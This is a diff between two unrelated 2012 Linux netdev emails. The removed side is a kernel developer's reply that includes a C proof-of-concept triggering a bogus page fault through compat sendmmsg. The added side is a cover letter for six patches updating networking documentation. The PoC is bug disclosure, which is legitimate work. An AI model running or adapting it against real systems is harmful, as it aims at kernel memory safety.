@@ -1,106 +1,51 @@
-From: Andy Lutomirski <luto@MIT.EDU>
-Subject: Re: sendmmsg: put_user vs __put_user
-Date: Thu, 05 Apr 2012 17:14:25 -0700
-Message-ID: <4F7E3561.8000803@mit.edu>
-References: <CAOPLpQf2bmj+i_zYtsS8JNzTDuBxCO5ByNRRqwv0kxaDBFdezg@mail.gmail.com> <20120330.205120.2221145622131588797.davem@davemloft.net>
+From: Ben Hutchings <bhutchings@solarflare.com>
+Subject: [PATCH net-next 0/6] Documentation fixes
+Date: Fri, 6 Apr 2012 01:37:47 +0100
+Message-ID: <1333672667.2652.22.camel@bwh-desktop.uk.solarflarecom.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=ISO-8859-1
+Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: 7bit
-Cc: drepper@gmail.com, netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org
+Cc: netdev <netdev@vger.kernel.org>
 To: David Miller <davem@davemloft.net>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20120330.205120.2221145622131588797.davem@davemloft.net>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from exchange.solarflare.com ([216.237.3.220]:28017 "EHLO
+	ocex02.SolarFlarecom.com" rhost-flags-OK-FAIL-OK-FAIL)
+	by vger.kernel.org with ESMTP id S1752951Ab2DFAhv (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Thu, 5 Apr 2012 20:37:51 -0400
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On 03/30/2012 05:51 PM, David Miller wrote:
-> From: Ulrich Drepper <drepper@gmail.com>
-> Date: Fri, 30 Mar 2012 09:36:11 -0400
-> 
->> Shouldn't the compat code in the sendmmsg implementation use the same
->> code as the normal code?  In which case you probably want something
->> like this:
-> 
-> Compat processes are not able to generate virtual addresses anywhere
-> near the range where the kernel resides, so the address range
-> verification done by put_user() is completely superfluous and
-> therefore not necessary.  The normal exception handling done by the
-> access is completely sufficient.
+These changes update Documentation/networking/driver.txt and
+Documentation/networking/netdevices.txt to reflect the last 5 or so
+years of API changes (though no new features are documented).
 
-I disagree.  The following exploit causes a bogus page fault to a kernel
-address.  I think this isn't exploitable right now on x86-64 because the
-page fault handler fixes it up, but I wouldn't be surprised if this
-crashes or at least warns on some architecture.  (Actually trashing
-kernel memory is probably impossible with this on x86-64 chips because
-this can only overrun user space by four bytes, and there's a giant gap
-of impossible addresses above user space in x86-64.
+They also remove documentation of a wrinkle in ethtool_ops that I
+recently fixed.
 
-Compile as 64 bit code.  Tested by instrumenting the page fault handler.
+These could safely be applied to either net or net-next; they can't
+break anything but another 3 months of dust isn't going to make much
+difference.
 
-/* Not quite working exploit.  Copyright (c) 2012 Andy Lutomirski. */
+Ben.
 
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <netinet/ip.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <syscall.h>
-#include <stdio.h>
+Ben Hutchings (6):
+  ethtool: Remove exception to the requirement of holding RTNL lock
+  doc, net: Remove obsolete reference to dev->poll
+  doc, net: Update documentation of synchronisation for TX multiqueue
+  doc, net: Update netdev operation names
+  doc, net: Remove instruction to set net_device::trans_start
+  doc, net: Update ndo_start_xmit return type and values
 
-#define COMPAT_MSGHDR_SIZE 28
-#define TASK_SIZE_MAX	((1UL << 47) - 4096)
-#define MSG_CMSG_COMPAT 0x80000000
+ Documentation/networking/driver.txt     |   31 +++++++++++++++----------------
+ Documentation/networking/netdevices.txt |   25 ++++++++++++-------------
+ include/linux/ethtool.h                 |    3 +--
+ 3 files changed, 28 insertions(+), 31 deletions(-)
 
-int main()
-{
-	int s;
-	struct sockaddr_in addr;
-	struct msghdr *hdr;
+-- 
+1.7.7.6
 
-	char *highpage = mmap((void*)(TASK_SIZE_MAX - 4096), 4096,
-	                      PROT_READ | PROT_WRITE,
-	                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-	                      -1, 0);
-	if (highpage == MAP_FAILED) {
-		perror("mmap");
-		return 1;
-	}
 
-	s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	if (s == -1) {
-		perror("socket");
-		return 1;
-	}
-
-        addr.sin_family = AF_INET;
-        addr.sin_port = htons(1);
-        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-	if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
-		perror("connect");
-		return 1;
-	}
-
-	void *evil = highpage + 4096 - COMPAT_MSGHDR_SIZE;
-	printf("Evil address is %p\n", evil);
-
-	// Purely for illustration.
-	if (sendmsg(s, evil, MSG_CMSG_COMPAT) < 0) {
-		perror("sendmsg");
-		return 1;
-	}
-	memset(highpage, 0, 4096);
-	{
-		int tmp;
-		socklen_t sz;
-		getsockopt(s, SOL_SOCKET, SO_ERROR, &tmp, &sz);
-	}
-
-	if (syscall(__NR_sendmmsg, s, evil, 1, MSG_CMSG_COMPAT) < 0) {
-		perror("sendmmsg");
-		return 1;
-	}
-
-	return 0;
-}
+-- 
+Ben Hutchings, Staff Engineer, Solarflare
+Not speaking for my employer; that's the marketing department's job.
+They asked us to note that Solarflare product names are trademarked.
